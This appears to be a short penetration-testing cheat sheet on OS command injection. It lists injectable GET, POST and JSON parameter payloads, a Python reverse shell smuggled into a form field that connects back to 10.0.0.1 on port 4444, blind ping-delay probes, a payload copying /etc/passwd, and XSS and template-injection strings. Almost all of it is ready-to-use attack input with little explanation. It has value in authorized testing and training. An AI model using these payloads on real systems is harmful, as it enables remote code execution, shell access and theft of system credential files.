---
title: OS Command Injection
description: 
tags:
    - Remote Code Execution
    - Reverse Shell
    - Web
refs:
date: 2023-01-06
draft: false
---

## GET Parameters

```txt
/api/cmd/whoami
/command/whoami

/?cmd=whoami
/?cmd=;id

/?cmd=ls
/?cmd=ls ..
/?cmd=ls ../
/?cmd=ls /home
```

<br />

## POST Parameters

```sh
productId=1&stockId=1|whoami

file=example.jpg&filetype=png;ping -c 1 <local-ip>
```

### Reverse Shell

```sh
file=example.jpg&filetype=png;export RHOST="10.0.0.1";export RPORT=4444;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

### Blind Command Injection (Time Delay)

Use **"ping"** command to check if the website will be loaded with time delay.

```txt
name=michael&email=michael@example.com||ping+-c+10+127.0.0.1||&message=hello
email=test@test.com;ping+-c+15+127.0.0.1+#&message=hello
```

If we find the command can be executed, we can execute the other commands as below.

```txt
email=test@test.com;cp+/etc/passwd+./+#&message=hello
```

### JSON Injection

```json
{ "username": "\"; pwd \"" }
{"name":"<script>alert(1)</script>", "email":"victim@vulnerable.com"}
{"name": "admin", "content": "{{template: ./admin.php}}"}
```